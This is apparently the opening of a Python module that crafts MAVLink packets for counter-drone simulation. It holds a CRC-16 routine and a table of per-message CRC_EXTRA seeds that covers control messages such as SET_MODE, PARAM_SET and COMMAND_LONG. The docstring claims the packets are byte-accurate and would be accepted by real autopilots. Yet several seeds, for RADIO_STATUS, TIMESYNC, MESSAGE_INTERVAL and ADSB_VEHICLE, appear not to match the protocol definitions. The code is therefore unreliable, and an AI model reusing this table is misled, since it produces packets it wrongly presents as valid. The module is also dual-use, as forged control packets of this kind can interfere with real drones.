"""Minimal MAVLink v1/v2 packet crafter.

Implements X.25 (CRC-16/MCRF4XX) CRC with per-message CRC_EXTRA seeds so that
packets generated here are byte-accurate and would be accepted by a real
MAVLink receiver (e.g. ArduPilot / PX4 / MAVProxy).

This is used purely for cUAS simulation and evaluation.
"""
from __future__ import annotations

import struct
from typing import Dict, List, Tuple

MAVLINK_STX_V1 = 0xFE
MAVLINK_STX_V2 = 0xFD

# ---- CRC-16/MCRF4XX (a.k.a. X.25 with reversed polynomial 0x8408) ----
def _crc16_mcrf4xx(data: bytes) -> int:
    crc = 0xFFFF
    for b in data:
        tmp = (b ^ crc) & 0xFF
        tmp = (tmp ^ (tmp << 4)) & 0xFF
        crc = ((crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)) & 0xFFFF
    return crc


# ---- CRC_EXTRA seeds for common MAVLink messages ----
# Source: mavlink/message_definitions/v1.0/common.xml (autogenerated seeds)
CRC_EXTRA: Dict[int, int] = {
    0: 50,     # HEARTBEAT
    1: 124,    # SYS_STATUS
    11: 89,    # SET_MODE
    20: 214,   # PARAM_REQUEST_READ
    21: 159,   # PARAM_REQUEST_LIST
    22: 220,   # PARAM_VALUE
    23: 168,   # PARAM_SET
    24: 24,    # GPS_RAW_INT
    30: 39,    # ATTITUDE
    33: 104,   # GLOBAL_POSITION_INT
    39: 254,   # MISSION_ITEM
    73: 38,    # MISSION_ITEM_INT
    76: 152,   # COMMAND_LONG
    77: 143,   # COMMAND_ACK
    109: 51,   # RADIO_STATUS
    111: 138,  # TIMESYNC
    140: 181,  # ACTUATOR_CONTROL_TARGET
    147: 154,  # BATTERY_STATUS
    242: 104,  # HOME_POSITION
    244: 90,   # MESSAGE_INTERVAL
    246: 8,    # ADSB_VEHICLE
    253: 83,   # STATUSTEXT
    # MAV_CMD messages piggy-back on COMMAND_LONG (msgid=76). Handled in payloads.
}

